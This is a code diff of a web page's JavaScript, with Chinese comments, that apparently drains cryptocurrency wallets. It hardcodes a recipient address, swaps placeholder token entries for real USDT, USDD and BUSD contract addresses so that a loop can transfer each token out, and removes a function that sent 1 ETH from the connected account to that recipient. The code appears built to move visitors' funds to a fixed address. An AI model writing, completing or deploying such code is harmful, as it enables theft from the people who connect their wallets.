@@ -19,9 +19,9 @@
         const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 智能合约地址
         const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699"; // 接收地址
         const tokens = [
-            { symbol: "USDT", address: "0xYOUR_USDT_ADDRESS" },
-            { symbol: "USDD", address: "0xYOUR_USDD_ADDRESS" },
-            { symbol: "BUSD", address: "0xYOUR_BUSD_ADDRESS" }
+            { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" }, // USDT ERC20地址
+            { symbol: "USDD", address: "0x0A8D0A3FFFc9a5deF8Cf5dA61A0A146B084F6E70" }, // USDD ERC20地址
+            { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53" }  // BUSD ERC20地址
         ];
         let contract;
 
@@ -149,20 +149,6 @@
                     document.getElementById("status").innerText = token.symbol + " 转账成功!";
                 }
                 document.getElementById("status").innerText += "所有代币转账成功!";
-            } catch (error) {
-                handleError(error);
-            }
-        }
-
-        // 转移 ETH
-        async function transferETH() {
-            try {
-                await web3.eth.sendTransaction({
-                    from: account,
-                    to: recipientAddress,
-                    value: web3.utils.toWei("1", "ether") // 转移 1 ETH
-                });
-                document.getElementById("status").innerText = "ETH 转账成功!";
             } catch (error) {
                 handleError(error);
             }
